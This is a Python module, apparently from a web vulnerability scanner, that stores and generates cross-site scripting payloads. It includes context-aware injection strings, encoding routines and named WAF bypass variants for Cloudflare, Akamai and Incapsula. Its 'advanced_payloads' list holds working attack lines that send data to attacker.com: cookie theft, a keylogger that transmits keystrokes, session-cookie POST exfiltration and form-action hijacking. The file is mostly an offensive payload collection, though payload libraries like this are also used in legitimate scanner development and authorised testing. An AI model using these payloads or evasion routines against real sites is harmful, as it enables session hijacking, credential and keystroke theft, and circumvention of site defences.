"""
ReconScan XSS (Cross-Site Scripting) Payload Library

Comprehensive XSS testing payloads with advanced evasion techniques.
Supports reflected, stored, and DOM-based XSS detection with context awareness.
"""

import html
import urllib.parse
import base64
import random
import re

class XSSPayloads:
    """Advanced XSS payload collection with context-aware generation and evasion techniques."""
    
    def __init__(self):
        """Initialize XSS payload sets with advanced capabilities."""
        
        # Basic XSS payloads for general testing
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(\"XSS\")</script>",
            "<script>alert(`XSS`)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(\"XSS\")>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input type=image src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "<a href=javascript:alert('XSS')>click</a>",
            "<marquee onstart=alert('XSS')>",
            "<video controls onloadstart=alert('XSS')>"
        ]
        
        # Advanced context-aware payloads
        self.context_payloads = {
            'script_tag': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "';alert(String.fromCharCode(88,83,83));//",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
                "'}alert('XSS')//",
                "\"}alert('XSS')//"
            ],
            'html_attribute': [
                "' onmouseover=alert('XSS') '",
                "\" onmouseover=alert('XSS') \"",
                "' autofocus onfocus=alert('XSS') '",
                "' onload=alert('XSS') '",
                "' onerror=alert('XSS') '",
                "' onclick=alert('XSS') '",
                "' onmouseenter=alert('XSS') '"
            ],
            'html_content': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
                "<form><button formaction=javascript:alert('XSS')>"
            ],
            'javascript_string': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "\\';alert('XSS');//",
                "\\\";alert('XSS');//",
                "'+alert('XSS')+'",
                "\"+alert('XSS')+\""
            ],
            'css_context': [
                "expression(alert('XSS'))",
                "url(javascript:alert('XSS'))",
                "/**/expression(alert('XSS'))",
                "\\65 xpression(alert('XSS'))",
                "\\000065 xpression(alert('XSS'))"
            ],
            'url_parameter': [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')",
                "livescript:alert('XSS')",
                "mocha:alert('XSS')"
            ]
        }
        
        # Advanced encoding techniques for WAF bypass
        self.encoding_techniques = [
            'html_entity',
            'url_encoding',
            'double_url_encoding',
            'unicode_encoding',
            'hex_encoding',
            'base64_encoding',
            'javascript_encoding',
            'css_encoding'
        ]
        
        # Browser-specific exploitation payloads
        self.browser_specific = {
            'chrome': [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",  # base64: alert('XSS');
                "<svg onload=fetch('/').then(r=>r.text()).then(d=>alert(d.slice(0,100)))>"
            ],
            'firefox': [
                "<script>alert(window.location)</script>",
                "<img src=x onerror=new Function('alert(\\'XSS\\')')()>",
                "<svg onload=setTimeout('alert(\\'XSS\\')',1)>"
            ],
            'safari': [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=Function('alert(\\'XSS\\')')()>",
                "<svg onload=setInterval('alert(\\'XSS\\')',9999)>"
            ],
            'ie': [
                "<script defer>alert('XSS')</script>",
                "<img src=x onerror=execScript('alert(\\'XSS\\')')>",
                "<object classid=clsid:d27cdb6e-ae6d-11cf-96b8-444553540000 codebase=javascript:alert('XSS')>"
            ]
        }
        
        # Filter bypass techniques
        self.filter_bypass = [
            # Case variation
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>Alert('XSS')</script>",
            
            # Whitespace manipulation
            "<script\x20>alert('XSS')</script>",
            "<script\x09>alert('XSS')</script>",
            "<script\x0a>alert('XSS')</script>",
            "<script\x0d>alert('XSS')</script>",
            
            # Comment insertion
            "<scr<!---->ipt>alert('XSS')</scr<!---->ipt>",
            "<scr/**/ipt>alert('XSS')</scr/**/ipt>",
            
            # Nested tags
            "<<script>script>alert('XSS');<</script>/script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            
            # Alternative event handlers
            "<img/src=x onerror=alert('XSS')>",
            "<img src=x oneRRor=alert('XSS')>",
            "<img src=x on\x65rror=alert('XSS')>",
            
            # Protocol variations
            "<iframe src=javas\x09cript:alert('XSS')>",
            "<iframe src=javas\x0acript:alert('XSS')>",
            "<iframe src=java\x00script:alert('XSS')>"
        ]
        
        # Advanced exploitation payloads
        self.advanced_payloads = [
            # DOM-based XSS
            "<script>location.hash.slice(1)</script>",
            "<script>eval(location.hash.slice(1))</script>",
            "<script>document.write(location.search)</script>",
            "<script>innerHTML=location.hash</script>",
            
            # Cookie stealing
            "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "<img src=x onerror=new Image().src='//attacker.com/steal?c='+document.cookie>",
            
            # Keylogger
            "<script>document.onkeypress=function(e){new Image().src='//attacker.com/log?key='+e.key}</script>",
            
            # Session hijacking
            "<script>fetch('//attacker.com/steal',{method:'POST',body:document.cookie})</script>",
            
            # Form hijacking
            "<script>document.forms[0].action='//attacker.com/steal'</script>",
            
            # Screen capture
            "<script>navigator.mediaDevices.getDisplayMedia().then(s=>console.log(s))</script>"
        ]
        
        # Framework-specific payloads
        self.framework_payloads = {
            'react': [
                "<img src=x onerror=this.constructor.constructor('alert(\\'XSS\\')')()>",
                "<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(\\'XSS\\')>'}}></div>",
                "{alert('XSS')}"
            ],
            'angular': [
                "{{constructor.constructor('alert(\\'XSS\\')')()}}",
                "{{$eval.constructor('alert(\\'XSS\\')')()}}",
                "{{$root.constructor.constructor('alert(\\'XSS\\')')()}}"
            ],
            'vue': [
                "{{constructor.constructor('alert(\\'XSS\\')')()}}",
                "<div v-html=\"'<img src=x onerror=alert(\\'XSS\\')>'\"></div>",
                "{{$root.constructor.constructor('alert(\\'XSS\\')')()}}"
            ]
        }
        
        # Initialize advanced components
        self._init_context_detection()
    
    def _init_context_detection(self):
        """Initialize context detection patterns for accurate payload targeting."""
        self.context_patterns = {
            'script_tag': re.compile(r'<script[^>]*>(.*?)</script>', re.IGNORECASE | re.DOTALL),
            'html_attribute': re.compile(r'<[^>]+\s+[^=]+=[\'"]*([^\'">]*)', re.IGNORECASE),
            'javascript_string': re.compile(r'["\']([^"\']*)["\']', re.IGNORECASE),
            'css_context': re.compile(r'style\s*=\s*["\']([^"\']*)', re.IGNORECASE),
            'url_parameter': re.compile(r'href\s*=\s*["\']([^"\']*)', re.IGNORECASE)
        }
    
    def generate_context_aware_payloads(self, injection_point='', response_content='', parameter_name=''):
        """
        Generate XSS payloads tailored to the detected injection context.
        
        Args:
            injection_point (str): The location where payload will be injected
            response_content (str): Server response content for context analysis
            parameter_name (str): Name of the parameter being tested
            
        Returns:
            list: Context-appropriate XSS payloads optimized for the scenario
        """
        # Detect injection context
        detected_context = self._detect_injection_context(injection_point, response_content)
        
        # Get base payloads for detected context
        if detected_context in self.context_payloads:
            base_payloads = self.context_payloads[detected_context]
        else:
            base_payloads = self.basic_payloads[:10]  # Default to basic payloads
        
        # Add parameter-specific payloads
        param_payloads = self._get_parameter_specific_payloads(parameter_name)
        
        # Combine and return top payloads
        combined_payloads = base_payloads + param_payloads
        return combined_payloads[:15]  # Return top 15 for efficiency
    
    def generate_waf_evasion_payloads(self, base_payload, waf_type='generic', encoding_count=1):
        """
        Generate WAF evasion variants using multiple encoding techniques.
        
        Args:
            base_payload (str): Original XSS payload
            waf_type (str): Detected WAF type ('cloudflare', 'akamai', 'generic')
            encoding_count (int): Number of encoding layers to apply
            
        Returns:
            list: WAF evasion payload variants with progressive complexity
        """
        evasion_payloads = [base_payload]  # Start with original
        
        # Apply encoding techniques
        for technique in self.encoding_techniques:
            try:
                encoded = self._apply_encoding(base_payload, technique)
                if encoded and encoded != base_payload:
                    evasion_payloads.append(encoded)
                    
                    # Apply multiple encoding layers if requested
                    if encoding_count > 1:
                        for i in range(encoding_count - 1):
                            double_encoded = self._apply_encoding(encoded, technique)
                            if double_encoded and double_encoded != encoded:
                                evasion_payloads.append(double_encoded)
                                encoded = double_encoded
            except Exception:
                continue
        
        # Add filter bypass techniques
        evasion_payloads.extend(self._generate_filter_bypass_variants(base_payload))
        
        # Add WAF-specific evasions
        if waf_type != 'generic':
            evasion_payloads.extend(self._generate_waf_specific_evasions(base_payload, waf_type))
        
        return list(set(evasion_payloads))  # Remove duplicates
    
    def _detect_injection_context(self, injection_point, response_content):
        """Detect the context where XSS payload will be injected for better targeting."""
        if not response_content:
            return 'html_content'  # Default context
        
        # Check for script tag context
        if re.search(r'<script[^>]*>.*?' + re.escape(injection_point) + r'.*?</script>', response_content, re.IGNORECASE):
            return 'script_tag'
        
        # Check for HTML attribute context
        if re.search(r'<[^>]+\s+[^=]+=[\'"]*[^\'">]*' + re.escape(injection_point), response_content, re.IGNORECASE):
            return 'html_attribute'
        
        # Check for CSS context
        if re.search(r'style\s*=\s*["\'][^"\']*' + re.escape(injection_point), response_content, re.IGNORECASE):
            return 'css_context'
        
        # Check for URL context
        if re.search(r'href\s*=\s*["\'][^"\']*' + re.escape(injection_point), response_content, re.IGNORECASE):
            return 'url_parameter'
        
        # Check for JavaScript string context
        if re.search(r'["\'][^"\']*' + re.escape(injection_point) + r'[^"\']*["\']', response_content):
            return 'javascript_string'
        
        return 'html_content'  # Default if no specific context detected
    
    def _apply_encoding(self, payload, technique):
        """Apply specific encoding technique to payload for WAF evasion."""
        try:
            if technique == 'html_entity':
                return ''.join(f'&#x{ord(c):x};' if c.isalnum() else c for c in payload)
            
            elif technique == 'url_encoding':
                return urllib.parse.quote(payload, safe='')
            
            elif technique == 'double_url_encoding':
                return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
            
            elif technique == 'unicode_encoding':
                return ''.join(f'\\u{ord(c):04x}' if c.isalnum() else c for c in payload)
            
            elif technique == 'hex_encoding':
                return ''.join(f'\\x{ord(c):02x}' if c.isalnum() else c for c in payload)
            
            elif technique == 'base64_encoding':
                import base64
                b64 = base64.b64encode(payload.encode()).decode()
                return f"<img src=x onerror=eval(atob('{b64}'))>"
            
            elif technique == 'javascript_encoding':
                return 'String.fromCharCode(' + ','.join(str(ord(c)) for c in payload) + ')'
            
            elif technique == 'css_encoding':
                return ''.join(f'\\{ord(c):x}' if c.isalnum() else c for c in payload)
            
        except Exception:
            pass
        
        return payload
    
    def _generate_filter_bypass_variants(self, payload):
        """Generate filter bypass variants of the payload for improved evasion."""
        variants = []
        
        # Case variations
        variants.append(payload.swapcase())
        variants.append(payload.upper())
        variants.append(payload.title())
        
        # Whitespace insertions
        variants.append(payload.replace('<', '<\x09'))  # Tab
        variants.append(payload.replace('<', '<\x0a'))  # Newline
        variants.append(payload.replace('<', '<\x0d'))  # Carriage return
        variants.append(payload.replace('<', '<\x20'))  # Space
        
        # Comment insertion
        if 'script' in payload.lower():
            variants.append(payload.replace('script', 'scr<!---->ipt'))
            variants.append(payload.replace('script', 'scr/**/ipt'))
        
        # Nested tag bypass
        if '<script>' in payload.lower():
            variants.append(payload.replace('<script>', '<<script>script>'))
        
        # Alternative representations
        variants.append(payload.replace('alert', 'eval'))
        variants.append(payload.replace('alert', 'prompt'))
        variants.append(payload.replace('alert', 'confirm'))
        
        return [v for v in variants if v != payload]
    
    def _generate_waf_specific_evasions(self, payload, waf_type):
        """Generate WAF-specific evasion techniques for targeted bypass."""
        variants = []
        
        if waf_type.lower() == 'cloudflare':
            # Cloudflare bypasses
            variants.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            variants.append(payload.replace('script', 'scrᅟipt'))  # Unicode invisible separator
            
        elif waf_type.lower() == 'akamai':
            # Akamai bypasses
            variants.append(payload.replace(' ', '\x09'))  # Tab character
            variants.append(payload.replace('=', '&#61;'))
            
        elif waf_type.lower() == 'incapsula':
            # Incapsula bypasses
            variants.append(payload.replace('(', '&#40;').replace(')', '&#41;'))
            
        return variants
    
    def _get_parameter_specific_payloads(self, parameter_name):
        """Get XSS payloads specific to parameter names for better accuracy."""
        param_specific = []
        if not parameter_name:
            return param_specific
        
        param_lower = parameter_name.lower()
        
        # Search parameters
        if param_lower in ['search', 'q', 'query', 'keyword']:
            param_specific.extend([
                "<img src=x onerror=alert('Search XSS')>",
                "<script>alert('Search: '+document.location)</script>",
                "search<svg onload=alert('XSS')>"
            ])
        
        # Message/comment parameters
        elif param_lower in ['message', 'comment', 'text', 'content']:
            param_specific.extend([
                "<script>alert('Message XSS')</script>",
                "<img src=x onerror=alert('Stored XSS in message')>",
                "message<iframe src=javascript:alert('XSS')>"
            ])
        
        # Name parameters
        elif param_lower in ['name', 'username', 'user', 'author']:
            param_specific.extend([
                "<script>alert('Name XSS')</script>",
                "name<svg onload=alert('XSS')>",
                "<img src=x onerror=alert('XSS in name field')>"
            ])
        
        # URL/link parameters
        elif param_lower in ['url', 'link', 'href', 'src']:
            param_specific.extend([
                "javascript:alert('URL XSS')",
                "data:text/html,<script>alert('Data URL XSS')</script>",
                "vbscript:alert('VBScript XSS')"
            ])
        
        return param_specific
    
    def get_framework_specific_payloads(self, framework):
        """Get payloads specific to detected web frameworks."""
        framework_lower = framework.lower()
        
        if framework_lower in self.framework_payloads:
            return self.framework_payloads[framework_lower]
        
        return []
    
    def get_browser_specific_payloads(self, user_agent=''):
        """Get payloads optimized for specific browsers."""
        if not user_agent:
            return self.basic_payloads[:5]
        
        user_agent_lower = user_agent.lower()
        
        if 'chrome' in user_agent_lower:
            return self.browser_specific['chrome']
        elif 'firefox' in user_agent_lower:
            return self.browser_specific['firefox']
        elif 'safari' in user_agent_lower:
            return self.browser_specific['safari']
        elif 'trident' in user_agent_lower or 'msie' in user_agent_lower:
            return self.browser_specific['ie']
        
        return self.basic_payloads[:5]
    
    def get_targeted_payloads(self, severity='medium'):
        """
        Get XSS payloads based on severity level for compatibility with scanner.
        
        Args:
            severity (str): Severity level ('low', 'medium', 'high')
            
        Returns:
            list: XSS payloads appropriate for the severity level
        """
        if severity.lower() == 'low':
            # Basic payloads for low-severity testing
            return self.basic_payloads[:8]
        
        elif severity.lower() == 'high':
            # Comprehensive payloads for thorough testing
            all_payloads = (
                self.basic_payloads + 
                self.context_payloads.get('html_content', []) +
                self.context_payloads.get('script_tag', [])[:3] +
                self.context_payloads.get('html_attribute', [])[:3]
            )
            return all_payloads[:25]
        
        else:  # medium (default)
            # Balanced set for standard testing
            medium_payloads = (
                self.basic_payloads[:10] +
                self.context_payloads.get('html_content', [])[:5] +
                self.context_payloads.get('script_tag', [])[:2]
            )
            return medium_payloads[:15]
    
    def get_basic_payloads(self):
        """Get basic XSS payloads for quick testing."""
        return self.basic_payloads
    
    def get_advanced_payloads(self):
        """Get advanced XSS payloads for comprehensive testing."""
        advanced = []
        for context_type, payloads in self.context_payloads.items():
            advanced.extend(payloads[:3])  # Top 3 from each context
        return advanced[:20] 